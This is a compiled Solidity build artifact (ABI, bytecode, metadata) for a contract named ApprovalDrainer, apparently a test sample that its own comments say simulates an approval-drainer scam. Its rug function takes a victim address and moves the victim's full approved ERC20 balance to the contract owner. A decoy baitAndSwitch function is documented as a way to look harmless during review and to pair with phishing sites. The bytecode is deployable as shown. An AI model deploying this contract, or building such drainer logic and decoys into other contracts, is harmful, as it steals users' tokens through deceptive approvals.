{
    "abi": [
        {
            "type": "constructor",
            "inputs": [],
            "stateMutability": "nonpayable"
        },
        {
            "type": "function",
            "name": "baitAndSwitch",
            "inputs": [],
            "outputs": [
                {
                    "name": "",
                    "type": "string",
                    "internalType": "string"
                }
            ],
            "stateMutability": "pure"
        },
        {
            "type": "function",
            "name": "owner",
            "inputs": [],
            "outputs": [
                {
                    "name": "",
                    "type": "address",
                    "internalType": "address"
                }
            ],
            "stateMutability": "view"
        },
        {
            "type": "function",
            "name": "rug",
            "inputs": [
                {
                    "name": "token",
                    "type": "address",
                    "internalType": "address"
                },
                {
                    "name": "victim",
                    "type": "address",
                    "internalType": "address"
                }
            ],
            "outputs": [],
            "stateMutability": "nonpayable"
        }
    ],
    "bytecode": {
        "object": "0x608060405234801561000f575f80fd5b505f80546001600160a01b031916331790556103268061002e5f395ff3fe608060405234801561000f575f80fd5b506004361061003f575f3560e01c806359adde7f146100435780636a3b7ec2146100615780638da5cb5b14610076575b5f80fd5b61004b6100a0565b60405161005891906101f4565b60405180910390f35b61007461006f36600461025a565b6100c0565b005b5f54610088906001600160a01b031681565b6040516001600160a01b039091168152602001610058565b60606040518060600160405280602881526020016102c960289139905090565b6040516370a0823160e01b81526001600160a01b0382811660048301525f91908416906370a0823190602401602060405180830381865afa158015610107573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061012b919061028b565b90505f81116101735760405162461bcd60e51b815260206004820152601060248201526f1b9bdd1a1a5b99c81d1bc81cdd19585b60821b604482015260640160405180910390fd5b5f546040516323b872dd60e01b81526001600160a01b038481166004830152918216602482015260448101839052908416906323b872dd906064016020604051808303815f875af11580156101ca573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101ee91906102a2565b50505050565b5f6020808352835180828501525f5b8181101561021f57858101830151858201604001528201610203565b505f604082860101526040601f19601f8301168501019250505092915050565b80356001600160a01b0381168114610255575f80fd5b919050565b5f806040838503121561026b575f80fd5b6102748361023f565b91506102826020840161023f565b90509250929050565b5f6020828403121561029b575f80fd5b5051919050565b5f602082840312156102b2575f80fd5b815180151581146102c1575f80fd5b939250505056fe5468616e6b7320666f722074686520617070726f76616c212049276c6c206265206261636b2e2e2ea26469706673582212201bb909484622784b71f4970ab469764eb95933bc334592153b997f0b24c5272164736f6c63430008140033",
        "sourceMap": "1195:1686:2:-:0;;;1257:49;;;;;;;;;-1:-1:-1;1281:5:2;:18;;-1:-1:-1;;;;;;1281:18:2;1289:10;1281:18;;;1195:1686;;;;;;",
        "linkReferences": {}
    },
    "deployedBytecode": {
        "object": "0x608060405234801561000f575f80fd5b506004361061003f575f3560e01c806359adde7f146100435780636a3b7ec2146100615780638da5cb5b14610076575b5f80fd5b61004b6100a0565b60405161005891906101f4565b60405180910390f35b61007461006f36600461025a565b6100c0565b005b5f54610088906001600160a01b031681565b6040516001600160a01b039091168152602001610058565b60606040518060600160405280602881526020016102c960289139905090565b6040516370a0823160e01b81526001600160a01b0382811660048301525f91908416906370a0823190602401602060405180830381865afa158015610107573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061012b919061028b565b90505f81116101735760405162461bcd60e51b815260206004820152601060248201526f1b9bdd1a1a5b99c81d1bc81cdd19585b60821b604482015260640160405180910390fd5b5f546040516323b872dd60e01b81526001600160a01b038481166004830152918216602482015260448101839052908416906323b872dd906064016020604051808303815f875af11580156101ca573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101ee91906102a2565b50505050565b5f6020808352835180828501525f5b8181101561021f57858101830151858201604001528201610203565b505f604082860101526040601f19601f8301168501019250505092915050565b80356001600160a01b0381168114610255575f80fd5b919050565b5f806040838503121561026b575f80fd5b6102748361023f565b91506102826020840161023f565b90509250929050565b5f6020828403121561029b575f80fd5b5051919050565b5f602082840312156102b2575f80fd5b815180151581146102c1575f80fd5b939250505056fe5468616e6b7320666f722074686520617070726f76616c212049276c6c206265206261636b2e2e2ea26469706673582212201bb909484622784b71f4970ab469764eb95933bc334592153b997f0b24c5272164736f6c63430008140033",
        "sourceMap": "1195:1686:2:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2750:129;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;1858:536;;;;;;:::i;:::-;;:::i;:::-;;1226:20;;;;;-1:-1:-1;;;;;1226:20:2;;;;;;-1:-1:-1;;;;;1174:32:3;;;1156:51;;1144:2;1129:18;1226:20:2;1010:203:3;2750:129:2;2798:13;2823:49;;;;;;;;;;;;;;;;;;;2750:129;:::o;1858:536::-;1939:31;;-1:-1:-1;;;1939:31:2;;-1:-1:-1;;;;;1174:32:3;;;1939:31:2;;;1156:51:3;1921:15:2;;1939:23;;;;;;1129:18:3;;1939:31:2;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1921:49;;1998:1;1988:7;:11;1980:40;;;;-1:-1:-1;;;1980:40:2;;1609:2:3;1980:40:2;;;1591:21:3;1648:2;1628:18;;;1621:30;-1:-1:-1;;;1667:18:3;;;1660:46;1723:18;;1980:40:2;;;;;;;;2372:5;;2337:50;;-1:-1:-1;;;2337:50:2;;-1:-1:-1;;;;;2010:15:3;;;2337:50:2;;;1992:34:3;2372:5:2;;;2042:18:3;;;2035:43;2094:18;;;2087:34;;;2337:26:2;;;;;;1927:18:3;;2337:50:2;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;1911:483;1858:536;;:::o;14:548:3:-;126:4;155:2;184;173:9;166:21;216:6;210:13;259:6;254:2;243:9;239:18;232:34;284:1;294:140;308:6;305:1;302:13;294:140;;;403:14;;;399:23;;393:30;369:17;;;388:2;365:26;358:66;323:10;;294:140;;;298:3;483:1;478:2;469:6;458:9;454:22;450:31;443:42;553:2;546;542:7;537:2;529:6;525:15;521:29;510:9;506:45;502:54;494:62;;;;14:548;;;;:::o;567:173::-;635:20;;-1:-1:-1;;;;;684:31:3;;674:42;;664:70;;730:1;727;720:12;664:70;567:173;;;:::o;745:260::-;813:6;821;874:2;862:9;853:7;849:23;845:32;842:52;;;890:1;887;880:12;842:52;913:29;932:9;913:29;:::i;:::-;903:39;;961:38;995:2;984:9;980:18;961:38;:::i;:::-;951:48;;745:260;;;;;:::o;1218:184::-;1288:6;1341:2;1329:9;1320:7;1316:23;1312:32;1309:52;;;1357:1;1354;1347:12;1309:52;-1:-1:-1;1380:16:3;;1218:184;-1:-1:-1;1218:184:3:o;2132:277::-;2199:6;2252:2;2240:9;2231:7;2227:23;2223:32;2220:52;;;2268:1;2265;2258:12;2220:52;2300:9;2294:16;2353:5;2346:13;2339:21;2332:5;2329:32;2319:60;;2375:1;2372;2365:12;2319:60;2398:5;2132:277;-1:-1:-1;;;2132:277:3:o",
        "linkReferences": {}
    },
    "methodIdentifiers": {
        "baitAndSwitch()": "59adde7f",
        "owner()": "8da5cb5b",
        "rug(address,address)": "6a3b7ec2"
    },
    "rawMetadata": "{\"compiler\":{\"version\":\"0.8.20+commit.a1b79de6\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"baitAndSwitch\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"victim\",\"type\":\"address\"}],\"name\":\"rug\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{\"baitAndSwitch()\":{\"details\":\"This function does nothing except return a message. It mimics a \\\"normal\\\" or \\\"joke\\\" function to distract users and make the contract appear less dangerous during review. Commonly paired with phishing websites or fake dApps.\"},\"rug(address,address)\":{\"details\":\"How this works: 1. Victim previously approved this contract (often via phishing UI). 2. The contract reads the victim\\u2019s full token balance. 3. transferFrom is used to move ALL tokens to the attacker. No signature, no confirmation, no warning \\u2014 just a single call.\",\"params\":{\"token\":\"Address of the ERC20 token to steal\",\"victim\":\"Address of the user whose tokens will be drained\"}}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{\"baitAndSwitch()\":{\"notice\":\"Fake harmless function to build trust\"},\"rug(address,address)\":{\"notice\":\"Steals ALL approved tokens from a victim\"}},\"notice\":\"Simulates real approval-drainer scam\",\"version\":1}},\"settings\":{\"compilationTarget\":{\"test/ApprovalDrainer.sol\":\"ApprovalDrainer\"},\"evmVersion\":\"shanghai\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[\":ds-test/=lib/openzeppelin-contracts/lib/forge-std/lib/ds-test/src/\",\":erc4626-tests/=lib/openzeppelin-contracts/lib/erc4626-tests/\",\":forge-std/=lib/forge-std/src/\",\":openzeppelin-contracts/=lib/openzeppelin-contracts/\",\":openzeppelin/=lib/openzeppelin-contracts/contracts/\"]},\"sources\":{\"lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol\":{\"keccak256\":\"0x287b55befed2961a7eabd7d7b1b2839cbca8a5b80ef8dcbb25ed3d4c2002c305\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://bd39944e8fc06be6dbe2dd1d8449b5336e23c6a7ba3e8e9ae5ae0f37f35283f5\",\"dweb:/ipfs/QmPV3FGYjVwvKSgAXKUN3r9T9GwniZz83CxBpM7vyj2G53\"]},\"lib/openzeppelin-contracts/contracts/token/ERC20/extensions/IERC20Permit.sol\":{\"keccak256\":\"0xb264c03a3442eb37a68ad620cefd1182766b58bee6cec40343480392d6b14d69\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://28879d01fd22c07b44f006612775f8577defbe459cb01685c5e25cd518c91a71\",\"dweb:/ipfs/QmVgfkwv2Fxw6hhTcDUZhE7NkoSKjab3ipM7UaRbt6uXb5\"]},\"test/ApprovalDrainer.sol\":{\"keccak256\":\"0x1856407506a1143d4437d5b75390829ee724d2cf4ac1a2cb758d62ec7bb4ab70\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://5f7e89862fff51c594276cab3d76994e0bdaa4a40bf5b2dabc4c64e4813cdc1d\",\"dweb:/ipfs/QmX53FMr2khEsMJF5GS9yx3Tm5HhxEtSuTnEkEcF7TZnfD\"]}},\"version\":1}",
    "metadata": {
        "compiler": {
            "version": "0.8.20+commit.a1b79de6"
        },
        "language": "Solidity",
        "output": {
            "abi": [
                {
                    "inputs": [],
                    "stateMutability": "nonpayable",
                    "type": "constructor"
                },
                {
                    "inputs": [],
                    "stateMutability": "pure",
                    "type": "function",
                    "name": "baitAndSwitch",
                    "outputs": [
                        {
                            "internalType": "string",
                            "name": "",
                            "type": "string"
                        }
                    ]
                },
                {
                    "inputs": [],
                    "stateMutability": "view",
                    "type": "function",
                    "name": "owner",
                    "outputs": [
                        {
                            "internalType": "address",
                            "name": "",
                            "type": "address"
                        }
                    ]
                },
                {
                    "inputs": [
                        {
                            "internalType": "address",
                            "name": "token",
                            "type": "address"
                        },
                        {
                            "internalType": "address",
                            "name": "victim",
                            "type": "address"
                        }
                    ],
                    "stateMutability": "nonpayable",
                    "type": "function",
                    "name": "rug"
                }
            ],
            "devdoc": {
                "kind": "dev",
                "methods": {
                    "baitAndSwitch()": {
                        "details": "This function does nothing except return a message. It mimics a \"normal\" or \"joke\" function to distract users and make the contract appear less dangerous during review. Commonly paired with phishing websites or fake dApps."
                    },
                    "rug(address,address)": {
                        "details": "How this works: 1. Victim previously approved this contract (often via phishing UI). 2. The contract reads the victim’s full token balance. 3. transferFrom is used to move ALL tokens to the attacker. No signature, no confirmation, no warning — just a single call.",
                        "params": {
                            "token": "Address of the ERC20 token to steal",
                            "victim": "Address of the user whose tokens will be drained"
                        }
                    }
                },
                "version": 1
            },
            "userdoc": {
                "kind": "user",
                "methods": {
                    "baitAndSwitch()": {
                        "notice": "Fake harmless function to build trust"
                    },
                    "rug(address,address)": {
                        "notice": "Steals ALL approved tokens from a victim"
                    }
                },
                "version": 1
            }
        },
        "settings": {
            "remappings": [
                "ds-test/=lib/openzeppelin-contracts/lib/forge-std/lib/ds-test/src/",
                "erc4626-tests/=lib/openzeppelin-contracts/lib/erc4626-tests/",
                "forge-std/=lib/forge-std/src/",
                "openzeppelin-contracts/=lib/openzeppelin-contracts/",
                "openzeppelin/=lib/openzeppelin-contracts/contracts/"
            ],
            "optimizer": {
                "enabled": true,
                "runs": 200
            },
            "metadata": {
                "bytecodeHash": "ipfs"
            },
            "compilationTarget": {
                "test/ApprovalDrainer.sol": "ApprovalDrainer"
            },
            "evmVersion": "shanghai",
            "libraries": {}
        },
        "sources": {
            "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol": {
                "keccak256": "0x287b55befed2961a7eabd7d7b1b2839cbca8a5b80ef8dcbb25ed3d4c2002c305",
                "urls": [
                    "bzz-raw://bd39944e8fc06be6dbe2dd1d8449b5336e23c6a7ba3e8e9ae5ae0f37f35283f5",
                    "dweb:/ipfs/QmPV3FGYjVwvKSgAXKUN3r9T9GwniZz83CxBpM7vyj2G53"
                ],
                "license": "MIT"
            },
            "lib/openzeppelin-contracts/contracts/token/ERC20/extensions/IERC20Permit.sol": {
                "keccak256": "0xb264c03a3442eb37a68ad620cefd1182766b58bee6cec40343480392d6b14d69",
                "urls": [
                    "bzz-raw://28879d01fd22c07b44f006612775f8577defbe459cb01685c5e25cd518c91a71",
                    "dweb:/ipfs/QmVgfkwv2Fxw6hhTcDUZhE7NkoSKjab3ipM7UaRbt6uXb5"
                ],
                "license": "MIT"
            },
            "test/ApprovalDrainer.sol": {
                "keccak256": "0x1856407506a1143d4437d5b75390829ee724d2cf4ac1a2cb758d62ec7bb4ab70",
                "urls": [
                    "bzz-raw://5f7e89862fff51c594276cab3d76994e0bdaa4a40bf5b2dabc4c64e4813cdc1d",
                    "dweb:/ipfs/QmX53FMr2khEsMJF5GS9yx3Tm5HhxEtSuTnEkEcF7TZnfD"
                ],
                "license": "MIT"
            }
        },
        "version": 1
    },
    "id": 2
}